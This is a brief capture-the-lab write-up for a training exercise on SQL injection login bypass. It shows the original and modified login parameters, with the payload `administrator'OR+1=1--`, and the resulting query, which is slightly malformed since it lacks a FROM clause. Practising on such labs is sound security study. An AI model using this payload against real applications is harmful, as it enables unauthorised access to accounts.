# Lab - SQL injection vulnerability allowing login bypass


>Perform an SQL injection attack that logs in to the application as the administrator user. 


Parameter:
```
csrf=XXXXXXXX&username=administrator&password=1
```

Modified:
```
csrf=XXXXXXXX&username=administrator'OR+1=1--&password=1
```

```
SELECT username, password WHERE username='administrator' OR 1=1 -- 'AND password='fahmi'
```


